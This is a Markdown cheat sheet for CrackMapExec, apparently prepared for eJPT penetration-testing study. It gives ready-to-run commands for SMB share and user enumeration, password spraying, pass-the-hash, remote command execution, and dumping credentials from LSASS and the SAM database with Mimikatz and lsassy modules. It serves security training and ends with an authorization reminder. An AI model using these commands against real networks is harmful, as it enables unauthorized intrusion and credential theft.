# CrackMapExec Cheat Sheet

**CrackMapExec** (CME) is a Swiss-army-knife post-exploitation and enumeration tool for Windows/Active Directory environments — it combines SMB enumeration, credential validation, password spraying, and remote command execution in a single tool, and shows up throughout eJPT's host/network module. This document covers its core SMB workflow plus the credential-testing and execution features that make it a daily driver on AD engagements.

---

## Table of Contents

1. [What CrackMapExec (CME) Does](#1-what-crackmapexec-cme-does)
2. [SMB Enumeration](#2-smb-enumeration)
3. [Credential Testing / Password Spraying](#3-credential-testing--password-spraying)
4. [Command Execution](#4-command-execution)
5. [Modules](#5-modules)
6. [Other Protocols](#6-other-protocols)
7. [Quick Command Reference](#7-quick-command-reference)

---

## 1. What CrackMapExec (CME) Does

CME is built around the idea of running the same operation across one host or an entire subnet at once — enumerate shares, validate credentials, dump hashes, or execute a command against every live target with one command line.

- **Enumeration:** shares, users, groups, password policy, logged-on sessions, SAM hashes
- **Credential testing:** validate a password/hash against many hosts or spray one password across many users
- **Execution:** run commands or PowerShell remotely once valid credentials are confirmed
- **Modules:** built-in scripts (Mimikatz, lsassy, etc.) for post-exploitation tasks

> This ties directly into `smb-windows-enumeration-cheatsheet-professional.md` and `active-directory-enumeration-cheatsheet-professional.md`, both of which already reference `crackmapexec` commands for null-session enumeration, authenticated enumeration, and pass-the-hash — this file is the fuller CME-specific reference for those workflows.

---

## 2. SMB Enumeration

CME's SMB protocol module is the default entry point — it works unauthenticated (null session) or with credentials, and each flag adds a different category of information to the output.

```bash
# Null session — test for anonymous access and list shares
crackmapexec smb target-ip -u '' -p '' --shares

# List domain users
crackmapexec smb target-ip -u user -p 'Password1' --users

# List domain groups
crackmapexec smb target-ip -u user -p 'Password1' --groups

# Pull the password/lockout policy
crackmapexec smb target-ip -u user -p 'Password1' --pass-pol

# Dump the local SAM database (requires admin privilege)
crackmapexec smb target-ip -u admin -p 'Password1' --sam
```

| Flag | Returns |
|---|---|
| `--shares` | Enumerates SMB shares and access level |
| `--users` | Domain/local user list |
| `--groups` | Domain/local group list |
| `--pass-pol` | Account lockout threshold and password policy |
| `--sam` | Local SAM hashes (needs admin rights) |

---

## 3. Credential Testing / Password Spraying

CME can validate credentials against a single host or an entire target list, and supports both plaintext passwords and NTLM hashes (pass-the-hash).

```bash
# Test one password against a list of usernames (spray) — check lockout policy first
crackmapexec smb target-ip -u users.txt -p 'Summer2026!' --continue-on-success

# Test a list of hosts with one set of credentials
crackmapexec smb targets.txt -u user -p 'Password1'

# Authenticate with an NTLM hash instead of a password (pass-the-hash)
crackmapexec smb target-ip -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

| Flag | Purpose |
|---|---|
| `-u` / `-p` | Username(s)/password(s) — accepts a single value or a file |
| `-H` | Authenticate with an NTLM hash instead of a password |
| `--continue-on-success` | Keep testing remaining users/hosts after a hit (needed for spraying) |

> Before spraying, confirm the lockout threshold with `--pass-pol` — the same warning covered in `active-directory-enumeration-cheatsheet-professional.md`'s password spraying section applies directly here.

---

## 4. Command Execution

Once valid credentials (or a valid hash) are confirmed, CME can execute commands remotely without a separate tool.

```bash
# Run a raw shell command
crackmapexec smb target-ip -u admin -p 'Password1' -x "whoami"

# Run a PowerShell command
crackmapexec smb target-ip -u admin -p 'Password1' -X "Get-Process"

# Choose the execution method explicitly (wmiexec, smbexec, atexec, mmcexec)
crackmapexec smb target-ip -u admin -p 'Password1' -x "whoami" --exec-method smbexec
```

| Flag | Purpose |
|---|---|
| `-x` | Execute a raw shell command |
| `-X` | Execute a PowerShell command |
| `--exec-method` | Force a specific execution technique instead of CME's default |

---

## 5. Modules

CME ships with post-exploitation modules that automate common tasks against confirmed-valid credentials.

```bash
# List all available modules
crackmapexec smb --list-modules
# (some versions use -L)

# Dump credentials from LSASS memory with Mimikatz
crackmapexec smb target-ip -u admin -p 'Password1' -M mimikatz

# Dump LSASS with lsassy (lighter-weight, avoids dropping Mimikatz to disk)
crackmapexec smb target-ip -u admin -p 'Password1' -M lsassy
```

| Flag | Purpose |
|---|---|
| `-M <module>` | Run a named module against the target |
| `-L` / `--list-modules` | List every module available |

---

## 6. Other Protocols

CME's tooling extends beyond SMB to other services commonly found in an AD environment.

```bash
crackmapexec winrm target-ip -u admin -p 'Password1'   # Test/execute over WinRM
crackmapexec mssql target-ip -u sa -p 'Password1'       # Test SQL Server auth, run queries
crackmapexec ldap target-ip -u user -p 'Password1' --users  # Enumerate via LDAP instead of SMB
```

---

## 7. Quick Command Reference

A single-page lookup for every command covered above.

| Need | Command |
|---|---|
| Null session share list | `crackmapexec smb target-ip -u '' -p '' --shares` |
| List users | `crackmapexec smb target-ip -u user -p pass --users` |
| List groups | `crackmapexec smb target-ip -u user -p pass --groups` |
| Password/lockout policy | `crackmapexec smb target-ip -u user -p pass --pass-pol` |
| Dump SAM | `crackmapexec smb target-ip -u admin -p pass --sam` |
| Password spray | `crackmapexec smb target-ip -u users.txt -p 'Pass1' --continue-on-success` |
| Pass-the-hash | `crackmapexec smb target-ip -u admin -H ntlmhash` |
| Run raw command | `crackmapexec smb target-ip -u admin -p pass -x "whoami"` |
| Run PowerShell | `crackmapexec smb target-ip -u admin -p pass -X "Get-Process"` |
| Mimikatz module | `crackmapexec smb target-ip -u admin -p pass -M mimikatz` |
| WinRM | `crackmapexec winrm target-ip -u admin -p pass` |
| MSSQL | `crackmapexec mssql target-ip -u sa -p pass` |
| LDAP | `crackmapexec ldap target-ip -u user -p pass --users` |

---

*Prepared as a reference for the eJPT host/network pentest module. All techniques should only be used within written authorization (scope/RoE).*
